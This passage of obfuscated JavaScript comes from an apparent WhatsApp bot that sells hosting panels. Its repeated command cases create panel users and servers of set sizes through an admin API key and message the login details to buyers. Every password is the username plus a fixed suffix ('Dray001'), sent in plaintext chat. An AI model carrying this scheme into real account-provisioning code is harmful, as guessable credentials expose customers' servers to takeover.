          let _0x363bcc = await _0x5dd2ef.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x2a06f2.id + "\n📌NAME: " + _0x2a06f2.first_name + " " + _0x2a06f2.last_name + "\n💵MEMORY: " + (_0xd4c456.limits.memory === 0 ? "Unlimited" : _0xd4c456.limits.memory) + " MB\n📦DISK: " + (_0xd4c456.limits.disk === 0 ? "Unlimited" : _0xd4c456.limits.disk) + " MB\n⌛CPU: " + _0xd4c456.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "unli":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.owner);
          }
          let _0x1781c4 = _0x2ece04.split(",");
          if (_0x1781c4.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x5de18c = _0x1781c4[0];
          let _0x8aa3ac = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x1781c4[1] ? _0x1781c4[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0xc0aeda = _0x5de18c + "unli";
          let _0x2cd722 = global.eggsnya;
          let _0x5d32c2 = global.location;
          let _0x30f74 = "0";
          let _0xc11a91 = "0";
          let _0x5db5d0 = "0";
          let _0x3921a0 = _0x5de18c + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x8aa3ac) {
            return;
          }
          let _0x1d1eab = (await _0x554af5.onWhatsApp(_0x8aa3ac.split`@`[0]))[0] || {};
          let _0x3c8d85 = _0x5de18c + "Dray001";
          let _0x45ef6a = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x3921a0,
              username: _0x5de18c,
              first_name: _0x5de18c,
              last_name: _0x5de18c,
              language: "en",
              password: _0x3c8d85
            })
          });
          let _0x8a1a1 = await _0x45ef6a.json();
          if (_0x8a1a1.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x8a1a1.errors[0], null, 2));
          }
          let _0x1addf5 = _0x8a1a1.attributes;
          let _0xd758e7 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2cd722, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x1addf5.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x8aa3ac.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x1addf5.username + "\n*➣ PASSWORD* : " + _0x3c8d85 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x8aa3ac, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0xa0f9b1 = await _0xd758e7.json();
          let _0xab1ade = _0xa0f9b1.attributes.startup;
          let _0x1fd059 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0xc0aeda,
              description: " ",
              user: _0x1addf5.id,
              egg: parseInt(_0x2cd722),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0xab1ade,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x30f74,
                swap: 0,
                disk: _0x5db5d0,
                io: 500,
                cpu: _0xc11a91
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x5d32c2)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x517d31 = await _0x1fd059.json();
          if (_0x517d31.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x517d31.errors[0], null, 2));
          }
          let _0x376473 = _0x517d31.attributes;
          let _0x480485 = await _0x5dd2ef.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x1addf5.id + "\n📌NAME: " + _0x1addf5.first_name + " " + _0x1addf5.last_name + "\n💵MEMORY: " + (_0x376473.limits.memory === 0 ? "Unlimited" : _0x376473.limits.memory) + " MB\n📦DISK: " + (_0x376473.limits.disk === 0 ? "Unlimited" : _0x376473.limits.disk) + " MB\n⌛CPU: " + _0x376473.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "5gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x3aabf1 = _0x2ece04.split(",");
          if (_0x3aabf1.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x15b5d3 = _0x3aabf1[0];
          let _0x4609ab = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x3aabf1[1] ? _0x3aabf1[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x2f1d73 = _0x15b5d3 + "5gb";
          let _0x514f60 = global.eggsnya;
          let _0x59490c = global.location;
          let _0x463e28 = "5138";
          let _0x2d4e2b = "100";
          let _0x3f29df = "5138";
          let _0x545774 = _0x15b5d3 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x4609ab) {
            return;
          }
          let _0x33145e = (await _0x554af5.onWhatsApp(_0x4609ab.split`@`[0]))[0] || {};
          let _0x1186da = _0x15b5d3 + "Dray001";
          let _0x4d7146 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x545774,
              username: _0x15b5d3,
              first_name: _0x15b5d3,
              last_name: _0x15b5d3,
              language: "en",
              password: _0x1186da
            })
          });
          let _0xaf1d7 = await _0x4d7146.json();
          if (_0xaf1d7.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0xaf1d7.errors[0], null, 2));
          }
          let _0x4cbcab = _0xaf1d7.attributes;
          let _0x554c3c = await fetch(domain + "/api/application/nests/5/eggs/" + _0x514f60, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x4cbcab.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x4609ab.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x4cbcab.username + "\n*➣ PASSWORD* : " + _0x1186da + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x4609ab, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x5b180b = await _0x554c3c.json();
          let _0x384c95 = _0x5b180b.attributes.startup;
          let _0x243dfe = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x2f1d73,
              description: " ",
              user: _0x4cbcab.id,
              egg: parseInt(_0x514f60),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x384c95,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x463e28,
                swap: 0,
                disk: _0x3f29df,
                io: 500,
                cpu: _0x2d4e2b
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x59490c)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x8661b6 = await _0x243dfe.json();
          if (_0x8661b6.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x8661b6.errors[0], null, 2));
          }
          let _0x1b9bac = _0x8661b6.attributes;
          let _0x4c15c8 = await _0x5dd2ef.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x4cbcab.id + "\n📌NAME: " + _0x4cbcab.first_name + " " + _0x4cbcab.last_name + "\n💵MEMORY: " + (_0x1b9bac.limits.memory === 0 ? "Unlimited" : _0x1b9bac.limits.memory) + " MB\n📦DISK: " + (_0x1b9bac.limits.disk === 0 ? "Unlimited" : _0x1b9bac.limits.disk) + " MB\n⌛CPU: " + _0x1b9bac.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "6gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x848f3e = _0x2ece04.split(",");
          if (_0x848f3e.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x3a8314 = _0x848f3e[0];
          let _0x18b7f4 = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x848f3e[1] ? _0x848f3e[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x1b3141 = _0x3a8314 + "6GB";
          let _0x549ecb = global.eggsnya;
          let _0x10c690 = global.location;
          let _0x210258 = "6138";
          let _0x4524b9 = "120";
          let _0x40dd1d = "6138";
          let _0x5031a9 = _0x3a8314 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x18b7f4) {
            return;
          }
          let _0x181940 = (await _0x554af5.onWhatsApp(_0x18b7f4.split`@`[0]))[0] || {};
          let _0x46472f = _0x3a8314 + "Dray001";
          let _0x16a1f9 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x5031a9,
              username: _0x3a8314,
              first_name: _0x3a8314,
              last_name: _0x3a8314,
              language: "en",
              password: _0x46472f
            })
          });
          let _0xd34920 = await _0x16a1f9.json();
          if (_0xd34920.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0xd34920.errors[0], null, 2));
          }
          let _0x12bbcc = _0xd34920.attributes;
          let _0x2bf23d = await fetch(domain + "/api/application/nests/5/eggs/" + _0x549ecb, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x12bbcc.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x18b7f4.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x12bbcc.username + "\n*➣ PASSWORD* : " + _0x46472f + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x18b7f4, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x15e2f9 = await _0x2bf23d.json();
          let _0x348ed4 = _0x15e2f9.attributes.startup;
          let _0x51b684 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x1b3141,
              description: " ",
              user: _0x12bbcc.id,
              egg: parseInt(_0x549ecb),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x348ed4,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x210258,
                swap: 0,
                disk: _0x40dd1d,
                io: 500,
                cpu: _0x4524b9
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x10c690)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x215a16 = await _0x51b684.json();
          if (_0x215a16.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x215a16.errors[0], null, 2));
          }
          let _0x371fec = _0x215a16.attributes;
          let _0xc7a780 = await _0x5dd2ef.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x12bbcc.id + "\n📌NAME: " + _0x12bbcc.first_name + " " + _0x12bbcc.last_name + "\n💵MEMORY: " + (_0x371fec.limits.memory === 0 ? "Unlimited" : _0x371fec.limits.memory) + " MB\n📦DISK: " + (_0x371fec.limits.disk === 0 ? "Unlimited" : _0x371fec.limits.disk) + " MB\n⌛CPU: " + _0x371fec.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "7gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x51d424 = _0x2ece04.split(",");
          if (_0x51d424.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x168696 = _0x51d424[0];
          let _0x1fea4a = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x51d424[1] ? _0x51d424[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x5ecb5c = _0x168696 + "7GB";
          let _0x18755e = global.eggsnya;
          let _0xb00b3b = global.location;
          let _0x41cfa2 = "7138";
          let _0x57a002 = "140";
          let _0x1b9be6 = "7138";
          let _0x4287ef = _0x168696 + "@dray.offc";
          akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg";
          if (!_0x1fea4a) {
            return;
          }
          let _0xc17dee = (await _0x554af5.onWhatsApp(_0x1fea4a.split`@`[0]))[0] || {};
          let _0x2ff7b3 = _0x168696 + "Dray001";
          let _0x1c80b5 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x4287ef,
              username: _0x168696,
              first_name: _0x168696,
              last_name: _0x168696,
              language: "en",
              password: _0x2ff7b3
            })
          });
          let _0x7543f1 = await _0x1c80b5.json();
          if (_0x7543f1.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x7543f1.errors[0], null, 2));
          }
          let _0x34b987 = _0x7543f1.attributes;
          let _0x5a26db = await fetch(domain + "/api/application/nests/5/eggs/" + _0x18755e, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x34b987.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x1fea4a.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x34b987.username + "\n*➣ PASSWORD* : " + _0x2ff7b3 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x1fea4a, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x3a7810 = await _0x5a26db.json();
          let _0x207fba = _0x3a7810.attributes.startup;
          let _0x5eff06 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x5ecb5c,
              description: " ",
              user: _0x34b987.id,
              egg: parseInt(_0x18755e),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x207fba,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x41cfa2,
                swap: 0,
                disk: _0x1b9be6,
                io: 500,
                cpu: _0x57a002
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0xb00b3b)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x3519e0 = await _0x5eff06.json();
          if (_0x3519e0.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x3519e0.errors[0], null, 2));
          }
          let _0xa28dd7 = _0x3519e0.attributes;
          let _0x3ec7e3 = await _0x5dd2ef.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x34b987.id + "\n📌NAME: " + _0x34b987.first_name + " " + _0x34b987.last_name + "\n💵MEMORY: " + (_0xa28dd7.limits.memory === 0 ? "Unlimited" : _0xa28dd7.limits.memory) + " MB\n📦DISK: " + (_0xa28dd7.limits.disk === 0 ? "Unlimited" : _0xa28dd7.limits.disk) + " MB\n⌛CPU: " + _0xa28dd7.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "8gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x5d698d = _0x2ece04.split(",");
          if (_0x5d698d.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x4e408d = _0x5d698d[0];
          let _0x316607 = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x5d698d[1] ? _0x5d698d[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x1f6a46 = _0x4e408d + "8GB";
          let _0x12a974 = global.eggsnya;
          let _0x206e5a = global.location;
          let _0x22cd91 = "8138";
          let _0x3733ff = "160";
          let _0x2169ae = "8138";
          let _0x3ba65b = _0x4e408d + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x316607) {
            return;
          }
          let _0x29a361 = (await _0x554af5.onWhatsApp(_0x316607.split`@`[0]))[0] || {};
          let _0x4848ce = _0x4e408d + "Dray001";
          let _0x441dcd = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x3ba65b,
              username: _0x4e408d,
              first_name: _0x4e408d,
              last_name: _0x4e408d,
              language: "en",
              password: _0x4848ce
            })
          });
          let _0x19c223 = await _0x441dcd.json();
          if (_0x19c223.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x19c223.errors[0], null, 2));
          }
          let _0x4e2813 = _0x19c223.attributes;
          let _0x3c0e07 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x12a974, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x4e2813.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x316607.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x4e2813.username + "\n*➣ PASSWORD* : " + _0x4848ce + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0x316607, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x568ce5 = await _0x3c0e07.json();
          let _0x7e7733 = _0x568ce5.attributes.startup;
          let _0x4ae951 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x1f6a46,
              description: " ",
              user: _0x4e2813.id,
              egg: parseInt(_0x12a974),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x7e7733,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x22cd91,
                swap: 0,
                disk: _0x2169ae,
                io: 500,
                cpu: _0x3733ff
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x206e5a)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x46c4fb = await _0x4ae951.json();
          if (_0x46c4fb.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x46c4fb.errors[0], null, 2));
          }
          let _0x1b1b5e = _0x46c4fb.attributes;
          let _0x322ddf = await _0x5dd2ef.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x4e2813.id + "\n📌NAME: " + _0x4e2813.first_name + " " + _0x4e2813.last_name + "\n💵MEMORY: " + (_0x1b1b5e.limits.memory === 0 ? "Unlimited" : _0x1b1b5e.limits.memory) + " MB\n📦DISK: " + (_0x1b1b5e.limits.disk === 0 ? "Unlimited" : _0x1b1b5e.limits.disk) + " MB\n⌛CPU: " + _0x1b1b5e.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "9gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x28638b = _0x2ece04.split(",");
          if (_0x28638b.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x46735e = _0x28638b[0];
          let _0x647cd0 = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x28638b[1] ? _0x28638b[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x45fb07 = _0x46735e + "9GB";
          let _0x4a0630 = global.eggsnya;
          let _0x5accb2 = global.location;
          let _0x48b2b4 = "9138";
          let _0x23018b = "180";
          let _0x467e37 = "9138";
          let _0x7ba90d = _0x46735e + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0x647cd0) {
            return;
          }
          let _0x96dc0c = (await _0x554af5.onWhatsApp(_0x647cd0.split`@`[0]))[0] || {};
          let _0x305bb5 = _0x46735e + "Dray001";
          let _0x10e0d4 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x7ba90d,
              username: _0x46735e,
              first_name: _0x46735e,
              last_name: _0x46735e,
              language: "en",
              password: _0x305bb5
            })
          });
          let _0x5d8b13 = await _0x10e0d4.json();
          if (_0x5d8b13.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x5d8b13.errors[0], null, 2));
          }
          let _0x549f72 = _0x5d8b13.attributes;
          let _0x463f55 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4a0630, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x549f72.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0x647cd0.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x549f72.username + "\n*➣ PASSWORD* : " + _0x305bb5 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
